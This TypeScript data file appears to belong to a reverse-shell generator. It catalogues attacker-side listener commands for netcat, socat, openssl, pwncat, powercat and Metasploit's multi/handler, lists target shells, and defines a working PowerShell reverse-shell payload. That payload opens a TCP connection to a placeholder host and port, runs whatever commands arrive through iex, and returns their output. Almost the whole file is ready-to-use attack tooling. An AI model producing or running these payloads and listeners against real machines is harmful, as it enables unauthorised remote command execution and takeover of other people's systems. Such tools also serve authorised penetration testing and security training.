import type { Catalog } from './types'

export const LISTENERS: Catalog['listeners'] = [
  ['nc', 'nc -lvnp {port}'],
  ['nc (BSD)', 'nc -lvn {port}'],
  ['busybox nc', 'busybox nc -lp {port}'],
  ['ncat', 'ncat -lvnp {port}'],
  ['ncat.exe', 'ncat.exe -lvnp {port}'],
  ['ncat (TLS)', 'ncat --ssl -lvnp {port}'],
  ['nc (UDP)', 'nc -u -lvnp {port}'],
  ['rlwrap + nc', 'rlwrap -cAr nc -lvnp {port}'],
  ['rustcat', 'rcat listen {port}'],
  ['openssl', 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365 -subj "/CN=localhost"; openssl s_server -quiet -key key.pem -cert cert.pem -port {port}'],
  ['pwncat', 'python3 -m pwncat -lp {port}'],
  ['pwncat (windows)', 'python3 -m pwncat -m windows -lp {port}'],
  ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
  ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
  ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'],
  ['powercat', 'powercat -l -p {port}'],
  ['msfconsole', 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"'],
  ['msfconsole (bind)', 'msfconsole -q -x "use multi/handler; set payload {payload}; set rhost {target}; set lport {port}; exploit"'],
  ['msfconsole (meterpreter)', 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; set ExitOnSession false; exploit -j"'],
  ['msfconsole (meterpreter, bind)', 'msfconsole -q -x "use multi/handler; set payload {payload}; set rhost {target}; set lport {port}; set ExitOnSession false; exploit -j"'],
]

export const SHELLS: string[] = ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash']

const psBody = (err: string) =>
  `$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};` +
  `while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);` +
  `$o=(iex $d${err} | Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$y=([text.encoding]::ASCII).GetBytes($o2);$s.Write($y,0,$y.Length);$s.Flush()};$c.Close()`

export const SPECIAL: Catalog['special'] = { ps: psBody(''), psStderr: psBody(' 2>&1') }
